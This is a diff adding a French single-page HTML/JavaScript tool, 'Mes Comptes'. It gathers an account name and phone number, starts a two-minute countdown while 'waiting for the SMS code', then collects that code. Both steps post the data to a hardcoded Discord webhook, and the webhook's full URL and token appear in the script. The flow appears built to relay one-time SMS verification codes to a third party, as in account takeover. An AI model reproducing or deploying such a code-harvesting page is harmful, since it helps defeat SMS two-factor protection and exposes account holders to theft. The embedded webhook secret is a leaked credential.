@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mes Comptes</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    background: #060d1f;
+    color: #dce8ff;
+    font-family: "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    padding: 24px 16px;
+  }
+
+  h1 { font-size: 1.3rem; font-weight: 700; color: #7fb0ff; margin-bottom: 24px; letter-spacing: .02em; }
+
+  .carte {
+    width: 100%; max-width: 420px;
+    background: #0d1630;
+    border: 1px solid #1b2d5c;
+    border-radius: 16px;
+    padding: 28px 24px;
+  }
+
+  /* ÉTAPES */
+  .etapes {
+    display: flex; align-items: center; gap: 0;
+    margin-bottom: 28px;
+  }
+  .etape {
+    display: flex; align-items: center; gap: 8px;
+    flex: 1;
+  }
+  .num {
+    width: 30px; height: 30px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: .85rem; font-weight: 700; flex-shrink: 0;
+    background: #1b2d5c; color: #6f86b8;
+    transition: all .3s;
+  }
+  .num.actif { background: #2f7bff; color: #fff; box-shadow: 0 0 12px rgba(47,123,255,.5); }
+  .num.fait  { background: #3ddc97; color: #060d1f; }
+  .etape span { font-size: .82rem; color: #6f86b8; }
+  .etape span.actif { color: #dce8ff; }
+  .ligne-etape { flex: 0 0 24px; height: 2px; background: #1b2d5c; transition: background .4s; }
+  .ligne-etape.faite { background: #3ddc97; }
+
+  .champ { margin-bottom: 16px; }
+  label { display: block; font-size: .8rem; color: #6f86b8; margin-bottom: 6px; }
+  input {
+    width: 100%; padding: 12px 14px;
+    background: #060d1f; border: 1px solid #1b2d5c;
+    border-radius: 9px; color: #dce8ff; font: inherit; font-size: 1rem;
+    transition: border-color .2s;
+  }
+  input:focus { outline: none; border-color: #2f7bff; }
+  input::placeholder { color: #3d517f; }
+
+  .btn {
+    width: 100%; padding: 13px;
+    background: #2f7bff; color: #fff;
+    border: none; border-radius: 10px;
+    font: inherit; font-size: 1rem; font-weight: 700;
+    cursor: pointer; transition: background .2s;
+    margin-top: 4px;
+  }
+  .btn:hover:not(:disabled) { background: #4c8dff; }
+  .btn:disabled { opacity: .45; cursor: not-allowed; }
+
+  /* DÉCOMPTE */
+  .decompte-zone {
+    display: none;
+    flex-direction: column; align-items: center;
+    padding: 20px 0 8px;
+    gap: 10px;
+  }
+  .decompte-zone.visible { display: flex; }
+  .cercle-wrapper { position: relative; width: 120px; height: 120px; }
+  .cercle-wrapper svg { transform: rotate(-90deg); }
+  .cercle-bg { fill: none; stroke: #1b2d5c; stroke-width: 8; }
+  .cercle-prog { fill: none; stroke: #2f7bff; stroke-width: 8; stroke-linecap: round;
+    transition: stroke-dashoffset .9s linear; }
+  .temps-texte {
+    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    font-size: 1.6rem; font-weight: 700; color: #7fb0ff;
+    font-variant-numeric: tabular-nums;
+  }
+  .msg-attente { font-size: .85rem; color: #6f86b8; text-align: center; }
+  .msg-attente strong { color: #dce8ff; }
+
+  /* TOAST */
+  .toast {
+    display: none; align-items: center; gap: 8px;
+    padding: 10px 14px; border-radius: 9px;
+    font-size: .87rem; font-weight: 500;
+    margin-top: 14px;
+  }
+  .toast.ok    { background: #0a2e1f; color: #3ddc97; border: 1px solid #1a5e3d; display: flex; }
+  .toast.erreur{ background: #2a0a10; color: #ff5d73; border: 1px solid #5e1a24; display: flex; }
+
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<h1>📋 Mes Comptes</h1>
+
+<div class="carte">
+
+  <!-- INDICATEUR D'ÉTAPES -->
+  <div class="etapes">
+    <div class="etape">
+      <div class="num actif" id="n1">1</div>
+      <span class="actif" id="l1">Compte</span>
+    </div>
+    <div class="ligne-etape" id="ligne"></div>
+    <div class="etape">
+      <div class="num" id="n2">2</div>
+      <span id="l2">Code SMS</span>
+    </div>
+  </div>
+
+  <!-- ÉTAPE 1 -->
+  <div id="etape1">
+    <div class="champ">
+      <label for="pseudo">Nom du compte / Pseudo</label>
+      <input id="pseudo" type="text" placeholder="ex : Netflix_perso" autocomplete="off">
+    </div>
+    <div class="champ">
+      <label for="tel">Numéro de téléphone</label>
+      <input id="tel" type="tel" placeholder="ex : 06 12 34 56 78" autocomplete="off">
+    </div>
+    <button class="btn" id="btnEtape1">Envoyer et démarrer le compte à rebours</button>
+    <div class="toast" id="toast1"></div>
+  </div>
+
+  <!-- DÉCOMPTE -->
+  <div class="decompte-zone" id="decompteZone">
+    <div class="cercle-wrapper">
+      <svg width="120" height="120" viewBox="0 0 120 120">
+        <circle class="cercle-bg" cx="60" cy="60" r="52"/>
+        <circle class="cercle-prog" id="cercle" cx="60" cy="60" r="52"
+          stroke-dasharray="326.73" stroke-dashoffset="0"/>
+      </svg>
+      <div class="temps-texte" id="tempsTexte">2:00</div>
+    </div>
+    <p class="msg-attente">En attente du code SMS pour<br><strong id="pseudoAffiche">—</strong></p>
+  </div>
+
+  <!-- ÉTAPE 2 -->
+  <div id="etape2" class="hidden">
+    <div class="champ">
+      <label for="code">Code reçu par SMS</label>
+      <input id="code" type="text" placeholder="ex : 482917" autocomplete="off" inputmode="numeric">
+    </div>
+    <button class="btn" id="btnEtape2">Envoyer le code sur Discord</button>
+    <div class="toast" id="toast2"></div>
+  </div>
+
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1554138075515326546/tImbArvJw62TCrSlOmxYCAGALiz_erVrvC2lWSM6BrqFqSLA3wQ32pto4suvHMAD6wfk";
+const DUREE = 120; // secondes
+const CIRCONFERENCE = 326.73;
+
+let intervalId = null;
+let secondesRestantes = DUREE;
+let pseudoSave = "";
+
+async function envoyerDiscord(contenu) {
+  const rep = await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: contenu })
+  });
+  if (!rep.ok) throw new Error("HTTP " + rep.status);
+}
+
+function afficherToast(id, type, msg) {
+  const t = document.getElementById(id);
+  t.className = "toast " + type;
+  t.textContent = (type === "ok" ? "✅ " : "❌ ") + msg;
+}
+
+function majDecompte(sec) {
+  const m = Math.floor(sec / 60);
+  const s = sec % 60;
+  document.getElementById("tempsTexte").textContent = m + ":" + String(s).padStart(2, "0");
+  const offset = CIRCONFERENCE * (1 - sec / DUREE);
+  document.getElementById("cercle").style.strokeDashoffset = offset;
+}
+
+function demarrerDecompte() {
+  secondesRestantes = DUREE;
+  majDecompte(secondesRestantes);
+  document.getElementById("decompteZone").classList.add("visible");
+
+  intervalId = setInterval(() => {
+    secondesRestantes--;
+    majDecompte(secondesRestantes);
+    if (secondesRestantes <= 0) {
+      clearInterval(intervalId);
+      // Ouvrir étape 2 même si délai dépassé
+      ouvrirEtape2();
+    }
+  }, 1000);
+}
+
+function ouvrirEtape2() {
+  clearInterval(intervalId);
+  document.getElementById("decompteZone").classList.remove("visible");
+  document.getElementById("etape2").classList.remove("hidden");
+  document.getElementById("code").focus();
+
+  // Indicateur
+  document.getElementById("n1").className = "num fait";
+  document.getElementById("n1").textContent = "✓";
+  document.getElementById("l1").className = "";
+  document.getElementById("ligne").classList.add("faite");
+  document.getElementById("n2").className = "num actif";
+  document.getElementById("l2").className = "actif";
+}
+
+// ÉTAPE 1
+document.getElementById("btnEtape1").addEventListener("click", async () => {
+  const pseudo = document.getElementById("pseudo").value.trim();
+  const tel    = document.getElementById("tel").value.trim();
+  if (!pseudo || !tel) { afficherToast("toast1", "erreur", "Remplis les deux champs."); return; }
+
+  const btn = document.getElementById("btnEtape1");
+  btn.disabled = true; btn.textContent = "Envoi…";
+
+  try {
+    const msg = [
+      "📲 **Nouvelle demande de code SMS**",
+      "─────────────────────────",
+      "👤 **Compte :** " + pseudo,
+      "📞 **Numéro :** " + tel,
+      "─────────────────────────",
+      "🕐 " + new Date().toLocaleString("fr-FR")
+    ].join("\n");
+    await envoyerDiscord(msg);
+
+    pseudoSave = pseudo;
+    document.getElementById("pseudoAffiche").textContent = pseudo;
+    document.getElementById("etape1").style.display = "none";
+    afficherToast("toast1", "ok", "Envoyé !");
+    demarrerDecompte();
+  } catch (e) {
+    afficherToast("toast1", "erreur", "Échec : " + e.message);
+    btn.disabled = false; btn.textContent = "Envoyer et démarrer le compte à rebours";
+  }
+});
+
+// ÉTAPE 2
+document.getElementById("btnEtape2").addEventListener("click", async () => {
+  const code = document.getElementById("code").value.trim();
+  if (!code) { afficherToast("toast2", "erreur", "Entre le code reçu."); return; }
+
+  const btn = document.getElementById("btnEtape2");
+  btn.disabled = true; btn.textContent = "Envoi…";
+
+  try {
+    const msg = [
+      "🔑 **Code SMS reçu**",
+      "─────────────────────────",
+      "👤 **Compte :** " + pseudoSave,
+      "🔢 **Code :** `" + code + "`",
+      "─────────────────────────",
+      "🕐 " + new Date().toLocaleString("fr-FR")
+    ].join("\n");
+    await envoyerDiscord(msg);
+    afficherToast("toast2", "ok", "Code envoyé sur Discord !");
+    document.getElementById("code").value = "";
+
+    // Reset après 3 s
+    setTimeout(() => location.reload(), 3000);
+  } catch (e) {
+    afficherToast("toast2", "erreur", "Échec : " + e.message);
+    btn.disabled = false; btn.textContent = "Envoyer le code sur Discord";
+  }
+});
+
+// Entrée pour naviguer
+document.getElementById("pseudo").addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("tel").focus(); });
+document.getElementById("tel").addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("btnEtape1").click(); });
+document.getElementById("code").addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("btnEtape2").click(); });
+</script>
+</body>
+</html>
